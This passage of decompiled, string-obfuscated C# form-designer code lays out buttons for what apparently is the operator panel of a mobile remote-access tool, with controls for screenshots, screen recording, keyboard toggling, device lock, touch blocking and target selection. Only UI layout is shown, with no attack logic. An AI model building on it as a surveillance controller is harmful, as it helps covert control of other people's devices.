		this.scrshot.Cursor = System.Windows.Forms.Cursors.Hand;
		this.scrshot.Dock = System.Windows.Forms.DockStyle.Top;
		this.scrshot.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.scrshot.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.scrshot.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.scrshot.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.scrshot.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.scrshot.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.scrshot.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.scrshot.Location = new System.Drawing.Point(5, 43);
		this.scrshot.Name = EXGuarder._246D5A60;
		this.scrshot.Radius = 15;
		this.scrshot.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.scrshot.RectColor = System.Drawing.Color.Gray;
		this.scrshot.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.scrshot.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.scrshot.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.scrshot.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.scrshot.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.scrshot.Size = new System.Drawing.Size(40, 39);
		this.scrshot.Style = DrakeUI.Framework.UIStyle.Custom;
		this.scrshot.Symbol = 61502;
		this.scrshot.TabIndex = 7;
		this.mscrtshots.Cursor = System.Windows.Forms.Cursors.Hand;
		this.mscrtshots.Dock = System.Windows.Forms.DockStyle.Top;
		this.mscrtshots.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mscrtshots.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mscrtshots.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mscrtshots.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mscrtshots.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mscrtshots.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.mscrtshots.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.mscrtshots.Location = new System.Drawing.Point(5, 4);
		this.mscrtshots.Name = EXGuarder._52284A3E;
		this.mscrtshots.Radius = 15;
		this.mscrtshots.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.mscrtshots.RectColor = System.Drawing.Color.Gray;
		this.mscrtshots.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.mscrtshots.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mscrtshots.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.mscrtshots.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.mscrtshots.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.mscrtshots.Size = new System.Drawing.Size(40, 39);
		this.mscrtshots.Style = DrakeUI.Framework.UIStyle.Custom;
		this.mscrtshots.Symbol = 57350;
		this.mscrtshots.TabIndex = 20;
		this.Panel14.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel14.Location = new System.Drawing.Point(0, 493);
		this.Panel14.Name = EXGuarder._60490775;
		this.Panel14.Size = new System.Drawing.Size(50, 4);
		this.Panel14.TabIndex = 64;
		this.Panel10.Controls.Add(this.sondup);
		this.Panel10.Controls.Add(this.soundown);
		this.Panel10.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel10.Location = new System.Drawing.Point(0, 411);
		this.Panel10.Name = EXGuarder._57310517;
		this.Panel10.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.Panel10.Size = new System.Drawing.Size(50, 82);
		this.Panel10.TabIndex = 60;
		this.sondup.Cursor = System.Windows.Forms.Cursors.Hand;
		this.sondup.Dock = System.Windows.Forms.DockStyle.Top;
		this.sondup.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sondup.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sondup.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sondup.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sondup.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sondup.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.sondup.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sondup.Location = new System.Drawing.Point(5, 43);
		this.sondup.Name = EXGuarder._3F47102A;
		this.sondup.Radius = 15;
		this.sondup.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.sondup.RectColor = System.Drawing.Color.Gray;
		this.sondup.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.sondup.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sondup.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.sondup.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.sondup.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.sondup.Size = new System.Drawing.Size(40, 39);
		this.sondup.Style = DrakeUI.Framework.UIStyle.Custom;
		this.sondup.Symbol = 57448;
		this.sondup.TabIndex = 20;
		this.soundown.Cursor = System.Windows.Forms.Cursors.Hand;
		this.soundown.Dock = System.Windows.Forms.DockStyle.Top;
		this.soundown.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.soundown.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.soundown.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.soundown.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.soundown.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.soundown.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.soundown.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.soundown.Location = new System.Drawing.Point(5, 4);
		this.soundown.Name = EXGuarder._375D5A01;
		this.soundown.Radius = 15;
		this.soundown.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.soundown.RectColor = System.Drawing.Color.Gray;
		this.soundown.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.soundown.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.soundown.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.soundown.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.soundown.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.soundown.Size = new System.Drawing.Size(40, 39);
		this.soundown.Style = DrakeUI.Framework.UIStyle.Custom;
		this.soundown.Symbol = 57449;
		this.soundown.TabIndex = 7;
		this.Panel8.Controls.Add(this.keybordon);
		this.Panel8.Controls.Add(this.keybordoff);
		this.Panel8.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel8.Location = new System.Drawing.Point(0, 329);
		this.Panel8.Name = EXGuarder._073B6D42;
		this.Panel8.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.Panel8.Size = new System.Drawing.Size(50, 82);
		this.Panel8.TabIndex = 59;
		this.keybordon.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
		this.keybordon.Cursor = System.Windows.Forms.Cursors.Hand;
		this.keybordon.Dock = System.Windows.Forms.DockStyle.Top;
		this.keybordon.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordon.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordon.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordon.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordon.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordon.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.keybordon.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.keybordon.Image = BTMOB.My.Resources.Resources.keyboard_hide1;
		this.keybordon.Location = new System.Drawing.Point(5, 43);
		this.keybordon.Name = EXGuarder._6B26073B;
		this.keybordon.Radius = 15;
		this.keybordon.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.keybordon.RectColor = System.Drawing.Color.Gray;
		this.keybordon.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.keybordon.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordon.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.keybordon.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.keybordon.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.keybordon.Size = new System.Drawing.Size(40, 39);
		this.keybordon.Style = DrakeUI.Framework.UIStyle.Custom;
		this.keybordon.Symbol = 61753;
		this.keybordon.SymbolSize = 0;
		this.keybordon.TabIndex = 20;
		this.keybordoff.Cursor = System.Windows.Forms.Cursors.Hand;
		this.keybordoff.Dock = System.Windows.Forms.DockStyle.Top;
		this.keybordoff.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordoff.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordoff.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordoff.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordoff.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordoff.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.keybordoff.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.keybordoff.Image = BTMOB.My.Resources.Resources.keyboard_show;
		this.keybordoff.Location = new System.Drawing.Point(5, 4);
		this.keybordoff.Name = EXGuarder._78544556;
		this.keybordoff.Radius = 15;
		this.keybordoff.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.keybordoff.RectColor = System.Drawing.Color.Gray;
		this.keybordoff.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.keybordoff.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.keybordoff.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.keybordoff.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.keybordoff.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.keybordoff.Size = new System.Drawing.Size(40, 39);
		this.keybordoff.Style = DrakeUI.Framework.UIStyle.Custom;
		this.keybordoff.Symbol = 61754;
		this.keybordoff.TabIndex = 7;
		this.Panel7.Controls.Add(this.lokbtn);
		this.Panel7.Controls.Add(this.unlockbtn);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel7.Location = new System.Drawing.Point(0, 247);
		this.Panel7.Name = EXGuarder._6F626613;
		this.Panel7.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.Panel7.Size = new System.Drawing.Size(50, 82);
		this.Panel7.TabIndex = 56;
		this.lokbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.lokbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.lokbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.lokbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.lokbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.lokbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.lokbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.lokbtn.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.lokbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.lokbtn.Location = new System.Drawing.Point(5, 43);
		this.lokbtn.Name = EXGuarder._103B5633;
		this.lokbtn.Radius = 15;
		this.lokbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.lokbtn.RectColor = System.Drawing.Color.Gray;
		this.lokbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.lokbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.lokbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.lokbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.lokbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.lokbtn.Size = new System.Drawing.Size(40, 39);
		this.lokbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.lokbtn.Symbol = 57452;
		this.lokbtn.TabIndex = 20;
		this.unlockbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.unlockbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.unlockbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.unlockbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.unlockbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.unlockbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.unlockbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.unlockbtn.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.unlockbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.unlockbtn.Location = new System.Drawing.Point(5, 4);
		this.unlockbtn.Name = EXGuarder._4C27686D;
		this.unlockbtn.Radius = 15;
		this.unlockbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.unlockbtn.RectColor = System.Drawing.Color.Gray;
		this.unlockbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.unlockbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.unlockbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.unlockbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.unlockbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
		this.unlockbtn.Size = new System.Drawing.Size(40, 39);
		this.unlockbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.unlockbtn.Symbol = 57453;
		this.unlockbtn.TabIndex = 7;
		this.coloskeletonpick.Dock = System.Windows.Forms.DockStyle.Top;
		this.coloskeletonpick.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.coloskeletonpick.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.coloskeletonpick.Font = new System.Drawing.Font(EXGuarder._46447843, 12f);
		this.coloskeletonpick.Location = new System.Drawing.Point(0, 216);
		this.coloskeletonpick.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.coloskeletonpick.MinimumSize = new System.Drawing.Size(56, 0);
		this.coloskeletonpick.Name = EXGuarder._305C6B25;
		this.coloskeletonpick.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.coloskeletonpick.Radius = 15;
		this.coloskeletonpick.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.coloskeletonpick.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.coloskeletonpick.Size = new System.Drawing.Size(56, 31);
		this.coloskeletonpick.Style = DrakeUI.Framework.UIStyle.Custom;
		this.coloskeletonpick.TabIndex = 51;
		this.coloskeletonpick.Text = EXGuarder._035F6047;
		this.coloskeletonpick.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.coloskeletonpick.Value = System.Drawing.Color.FromArgb(2, 176, 117);
		this.coloskeletonpick.Watermark = EXGuarder._590F5C5D;
		this.ctrlbtn.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.ctrlbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.ctrlbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.ctrlbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ctrlbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ctrlbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ctrlbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ctrlbtn.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.ctrlbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.ctrlbtn.Location = new System.Drawing.Point(0, 180);
		this.ctrlbtn.Name = EXGuarder._05564C78;
		this.ctrlbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.ctrlbtn.RectColor = System.Drawing.Color.Gray;
		this.ctrlbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.ctrlbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ctrlbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.ctrlbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.ctrlbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.ctrlbtn.Size = new System.Drawing.Size(50, 36);
		this.ctrlbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.ctrlbtn.Symbol = 57470;
		this.ctrlbtn.SymbolSize = 28;
		this.ctrlbtn.TabIndex = 34;
		this.ctrlbtn.Tag = EXGuarder._510A6977;
		this.BTtiptool.SetToolTip(this.ctrlbtn, EXGuarder._50575B0F);
		this.blocktoch.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.blocktoch.Cursor = System.Windows.Forms.Cursors.Hand;
		this.blocktoch.Dock = System.Windows.Forms.DockStyle.Top;
		this.blocktoch.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blocktoch.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blocktoch.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blocktoch.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blocktoch.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.blocktoch.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.blocktoch.Location = new System.Drawing.Point(0, 144);
		this.blocktoch.Name = EXGuarder._4F292D3A;
		this.blocktoch.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.blocktoch.RectColor = System.Drawing.Color.Gray;
		this.blocktoch.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.blocktoch.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blocktoch.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.blocktoch.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.blocktoch.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.blocktoch.Size = new System.Drawing.Size(50, 36);
		this.blocktoch.Style = DrakeUI.Framework.UIStyle.Custom;
		this.blocktoch.Symbol = 57390;
		this.blocktoch.SymbolSize = 25;
		this.blocktoch.TabIndex = 66;
		this.blocktoch.Tag = EXGuarder._510A6977;
		this.BTtiptool.SetToolTip(this.blocktoch, EXGuarder._28266E0C);
		this.blockbtn.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.blockbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.blockbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.blockbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockbtn.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.blockbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.blockbtn.Location = new System.Drawing.Point(0, 108);
		this.blockbtn.Name = EXGuarder._26285F67;
		this.blockbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.blockbtn.RectColor = System.Drawing.Color.Gray;
		this.blockbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.blockbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.blockbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.blockbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.blockbtn.Size = new System.Drawing.Size(50, 36);
		this.blockbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.blockbtn.Symbol = 61552;
		this.blockbtn.SymbolSize = 28;
		this.blockbtn.TabIndex = 35;
		this.blockbtn.Tag = EXGuarder._510A6977;
		this.BTtiptool.SetToolTip(this.blockbtn, EXGuarder._5C053963);
		this.skltonbtn.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.skltonbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.skltonbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.skltonbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.skltonbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.skltonbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.skltonbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.skltonbtn.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.skltonbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.skltonbtn.Location = new System.Drawing.Point(0, 72);
		this.skltonbtn.Name = EXGuarder._506F0D2A;
		this.skltonbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.skltonbtn.RectColor = System.Drawing.Color.Gray;
		this.skltonbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.skltonbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.skltonbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.skltonbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.skltonbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.skltonbtn.Size = new System.Drawing.Size(50, 36);
		this.skltonbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.skltonbtn.Symbol = 57485;
		this.skltonbtn.SymbolSize = 25;
		this.skltonbtn.TabIndex = 36;
		this.skltonbtn.Tag = EXGuarder._510A6977;
		this.BTtiptool.SetToolTip(this.skltonbtn, EXGuarder._08111C6A);
		this.recscr.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.recscr.Cursor = System.Windows.Forms.Cursors.Hand;
		this.recscr.Dock = System.Windows.Forms.DockStyle.Top;
		this.recscr.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.recscr.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.recscr.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.recscr.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.recscr.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.recscr.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.recscr.Location = new System.Drawing.Point(0, 36);
		this.recscr.Name = EXGuarder._74764D4C;
		this.recscr.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.recscr.RectColor = System.Drawing.Color.Gray;
		this.recscr.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.recscr.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.recscr.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.recscr.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.recscr.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.recscr.Size = new System.Drawing.Size(50, 36);
		this.recscr.Style = DrakeUI.Framework.UIStyle.Custom;
		this.recscr.Symbol = 57572;
		this.recscr.SymbolSize = 25;
		this.recscr.TabIndex = 36;
		this.recscr.Tag = EXGuarder._510A6977;
		this.BTtiptool.SetToolTip(this.recscr, EXGuarder._08111C6A);
		this.autorotbtn.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.autorotbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.autorotbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.autorotbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.autorotbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.autorotbtn.Location = new System.Drawing.Point(0, 0);
		this.autorotbtn.Name = EXGuarder._1561584D;
		this.autorotbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.autorotbtn.RectColor = System.Drawing.Color.Gray;
		this.autorotbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.autorotbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.autorotbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.autorotbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.autorotbtn.Size = new System.Drawing.Size(50, 36);
		this.autorotbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.autorotbtn.Symbol = 61965;
		this.autorotbtn.SymbolSize = 25;
		this.autorotbtn.TabIndex = 36;
		this.autorotbtn.Tag = EXGuarder._510A6977;
		this.BTtiptool.SetToolTip(this.autorotbtn, EXGuarder._1A1D626D);
		this.confbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.confbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.confbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.confbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.confbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.confbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.confbtn.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.confbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.confbtn.ForeHoverColor = System.Drawing.Color.Gray;
		this.confbtn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.confbtn.Location = new System.Drawing.Point(17, 8);
		this.confbtn.Name = EXGuarder._586C4D41;
		this.confbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.confbtn.RectColor = System.Drawing.Color.Gray;
		this.confbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.confbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.confbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.confbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.confbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.confbtn.Size = new System.Drawing.Size(38, 29);
		this.confbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.confbtn.Symbol = 61573;
		this.confbtn.SymbolSize = 30;
		this.confbtn.TabIndex = 34;
		this.confbtn.Tag = EXGuarder._510A6977;
		this.BTtiptool.SetToolTip(this.confbtn, EXGuarder._2C2A576B);
		this.comboTargts.Dock = System.Windows.Forms.DockStyle.Left;
		this.comboTargts.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboTargts.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comboTargts.Font = new System.Drawing.Font(EXGuarder._46447843, 9f);
		this.comboTargts.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.comboTargts.ItemHeight = 30;
		this.comboTargts.Items.AddRange(new object[4]
		{
			EXGuarder._25384E63,
			EXGuarder._5A166716,
			EXGuarder._25192E0B,
			EXGuarder._23286225
		});
		this.comboTargts.Location = new System.Drawing.Point(55, 8);
		this.comboTargts.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.comboTargts.MinimumSize = new System.Drawing.Size(56, 0);
		this.comboTargts.Name = EXGuarder._456D2B13;
		this.comboTargts.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboTargts.Radius = 15;
		this.comboTargts.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.comboTargts.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboTargts.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboTargts.Size = new System.Drawing.Size(181, 25);
		this.comboTargts.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboTargts.TabIndex = 1;
		this.comboTargts.Text = EXGuarder._25384E63;
		this.comboTargts.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
